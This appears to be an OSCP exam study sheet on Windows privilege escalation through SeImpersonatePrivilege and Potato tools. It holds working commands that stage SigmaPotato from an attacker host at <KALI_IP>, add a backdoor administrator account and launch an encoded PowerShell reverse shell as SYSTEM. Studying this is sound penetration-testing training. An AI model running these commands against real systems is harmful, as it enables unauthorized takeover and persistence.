# 🪟 OSCP PEN-200 — SeImpersonatePrivilege & Potato Attacks

> **Goal:** Abuse SeImpersonatePrivilege → coerce SYSTEM to connect to
> controlled named pipe → impersonate SYSTEM → escalate privileges

---

## 📖 Concept

### SeImpersonatePrivilege
A Windows privilege that allows a process to **impersonate another user**
after capturing their authentication. Commonly assigned to service accounts:

```
IIS → ApplicationPoolIdentity  ┐
MSSQL → NetworkService         ├─ All have SeImpersonatePrivilege by default
Windows Services → various     ┘
```

### Named Pipes
A Windows Inter-Process Communication (IPC) mechanism allowing two unrelated
processes to share data — even across systems.

```
Pipe Server creates named pipe
→ Pipe Client connects to it
→ Server captures client authentication
→ Server impersonates client using SeImpersonatePrivilege
→ Operations run in client's security context
```

### The Attack Chain
```
You have SeImpersonatePrivilege (e.g. via web shell, service account)
→ Create controlled named pipe (Potato tool does this)
→ Coerce NT AUTHORITY\SYSTEM to connect to it
→ Capture SYSTEM authentication
→ Impersonate SYSTEM
→ Execute commands as SYSTEM
```

---

## ✅ Requirements

| Requirement | How to check |
|---|---|
| `SeImpersonatePrivilege` assigned | `whoami /priv` |
| Code execution as service account | Web shell, bind shell, etc. |
| Tool on target | Transfer via `iwr` |

---

## 🗺️ Attack Flow

### Step 1 — Check for SeImpersonatePrivilege

```cmd
whoami /priv
```

Look for:
```
SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
```

> `Disabled` state is fine — it just means the current process isn't
> using it right now. It can still be leveraged.

---

### Step 2 — Download SigmaPotato (Kali)

```bash
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
python3 -m http.server 80
```

---

### Step 3 — Transfer to Target

```powershell
iwr -uri http://<KALI_IP>/SigmaPotato.exe -OutFile SigmaPotato.exe
```

---

### Step 4 — Execute Commands as SYSTEM

```powershell
# Add new user
.\SigmaPotato "net user hacker password123! /add"

# Add to administrators
.\SigmaPotato "net localgroup Administrators hacker /add"

# Verify
net user
net localgroup Administrators
```

**Any command inside the quotes runs as NT AUTHORITY\SYSTEM:**
```powershell
# Reverse shell
.\SigmaPotato "powershell -e <base64_encoded_payload>"

# Check whoami
.\SigmaPotato "whoami"
```

---

## 🥔 Potato Family — Tool Variants

Multiple tools implement variations of this attack. Know these for the exam:

| Tool | Notes |
|---|---|
| `SigmaPotato` | Modern, reliable, recommended |
| `GodPotato` | Works on Windows Server 2012-2022 |
| `JuicyPotato` | Older, requires specific CLSID |
| `SweetPotato` | Service-to-SYSTEM impersonation |
| `RottenPotato` | Original — largely replaced by newer variants |

> When one potato fails, try another — OS version and patch level affects
> which variant works.

---

## 🔍 Common Contexts Where SeImpersonatePrivilege Appears

| Context | Account |
|---|---|
| IIS web shell | `IIS APPPOOL\DefaultAppPool` |
| MSSQL command execution | `NT SERVICE\MSSQL$<instance>` |
| Misconfigured Windows service | `NT AUTHORITY\NetworkService` |
| Local service accounts | `NT AUTHORITY\LocalService` |

---

## ⚖️ SeImpersonatePrivilege vs Other Privesc Techniques

| | Service Hijacking | Scheduled Tasks | SeImpersonatePrivilege |
|---|---|---|---|
| Requires writable binary | ✅ | ✅ | ❌ |
| Requires service restart | ✅ | ❌ | ❌ |
| Needs specific privilege | ❌ | ❌ | ✅ |
| Immediate execution | ❌ | ❌ | ✅ |
| Runs as | Service account | Task user | SYSTEM |

---

## ⚡ Quick Reference

```cmd
rem Check privilege
whoami /priv
```

```bash
# Kali — download and serve
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
python3 -m http.server 80
```

```powershell
# Transfer
iwr -uri http://<KALI_IP>/SigmaPotato.exe -OutFile SigmaPotato.exe

# Execute as SYSTEM
.\SigmaPotato "net user hacker password123! /add"
.\SigmaPotato "net localgroup Administrators hacker /add"

# Verify
net localgroup Administrators
```

---
